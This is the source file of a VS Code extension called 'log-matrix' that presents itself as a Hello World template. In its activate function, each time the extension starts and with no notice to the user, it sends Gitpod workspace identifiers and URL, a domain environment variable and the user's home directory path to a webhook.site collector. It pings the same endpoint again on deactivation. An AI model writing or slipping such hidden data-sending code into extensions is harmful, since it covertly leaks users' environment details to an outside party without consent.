// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
const vscode = require('vscode');
const axios = require('axios');
const os = require("os");

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed

/**
 * @param {vscode.ExtensionContext} context
 */
async function activate(context) {
	const userHomeDir = os.homedir();

	let payload = { date:  new Date(), purpose: 'extension started' , workspaceId:process.env.GITPOD_WORKSPACE_ID, workspaceUrl:process.env.GITPOD_WORKSPACE_URL, domain:process.env.DOMAIN,home:userHomeDir};
	console.log("payload",payload)
	await axios.post('https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c',payload);
	console.log('Congratulations, your extension "log-matrix" is now active!');


	let disposable = vscode.commands.registerCommand('log-matrix.helloWorld', function () {
	
		vscode.window.showInformationMessage('Hello World from log_matrix!');
	});

	context.subscriptions.push(disposable);
}

// This method is called when your extension is deactivated
async function deactivate() {
	console.log("extension stopped");
	let payload = { date:  new Date(), purpose: 'extension stopped' };
	await axios.post('https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c',payload);
}

module.exports = {
	activate,
	deactivate
}
